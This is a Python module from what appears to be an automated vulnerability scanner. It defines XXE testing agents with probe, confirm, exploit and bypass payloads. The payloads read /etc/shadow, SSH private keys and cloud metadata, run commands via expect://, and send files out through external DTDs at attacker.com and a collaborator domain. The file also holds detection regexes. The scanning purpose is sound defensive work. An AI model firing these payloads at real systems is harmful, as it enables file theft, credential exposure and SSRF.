"""XML External Entity (XXE) Agent - CWE-611."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class XXEAgent(BaseAgent):
    """
    XML External Entity (XXE) testing agent.

    Tests for XXE vulnerabilities including:
    - Classic external entity injection
    - Parameter entities
    - Blind XXE via out-of-band
    - XXE to SSRF

    Payloads derived from ZAP's XxeScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "xxe"

    @property
    def cweid(self) -> int:
        return 611

    @property
    def priority(self) -> int:
        return 8  # High priority - can lead to data disclosure

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic external entity
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_TEST">]><foo>&xxe;</foo>',
                # Check XML parsing
                '<?xml version="1.0"?><foo>test</foo>',
                # Minimal entity test
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY test "TEST_VALUE">]><foo>&test;</foo>',
            ],
            PayloadStage.CONFIRM: [
                # File read
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                # PHP filter wrapper
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
                # Parameter entity
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
            ],
            PayloadStage.EXPLOIT: [
                # Read sensitive files
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><foo>&xxe;</foo>',
                # SSRF via XXE
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
                # Expect wrapper (command execution)
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            ],
            PayloadStage.BYPASS: [
                # UTF-16 encoding
                '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                # Different entity syntax
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',
                # External DTD
                '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>',
                # Parameter entity with external DTD
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&send;</foo>',
                # Local DTD hijacking
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % local SYSTEM "file:///usr/share/xml/docbook.dtd">%local;]><foo>&xxe;</foo>',
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate XXE vulnerability."""
        patterns = [
            # Test entity reflection
            r"XXE_TEST",
            r"TEST_VALUE",
            # /etc/passwd content
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"nobody:.*:65534:",
            # win.ini content
            r"\[fonts\]",
            r"\[extensions\]",
            # PHP code (base64)
            r"<\?php",
            r"PD9waHA",  # Base64 for <?php
            # SSH keys
            r"-----BEGIN.*PRIVATE KEY-----",
            # Cloud metadata
            r"ami-[0-9a-f]+",
            r"instance-id",
            # XML errors indicating processing
            r"XML.*error",
            r"entity.*not.*found",
            r"parser.*error",
            r"undefined.*entity",
            # Java XML errors
            r"org\.xml\.sax",
            r"javax\.xml",
            r"SAXParseException",
            # .NET XML errors
            r"System\.Xml",
            r"XmlException",
        ]
        return [re.compile(p, re.IGNORECASE) for p in patterns]


class XXEBlindAgent(XXEAgent):
    """Specialized agent for blind XXE using out-of-band techniques."""

    @property
    def vulnerability_type(self) -> str:
        return "xxe_blind"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # External DTD probe
                '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://COLLABORATOR_DOMAIN/xxe-probe"><foo>test</foo>',
                # Parameter entity probe
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN/xxe-probe">%xxe;]><foo>test</foo>',
            ],
            PayloadStage.CONFIRM: [
                # External DTD with data exfil
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd SYSTEM "http://COLLABORATOR_DOMAIN/collect?data=%file;">%dtd;]><foo>test</foo>',
            ],
            PayloadStage.EXPLOIT: [
                # Full OOB XXE
                '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://COLLABORATOR_DOMAIN/oob.dtd">
  %dtd;
]>
<foo>&send;</foo>''',
            ],
            PayloadStage.BYPASS: [],
        }
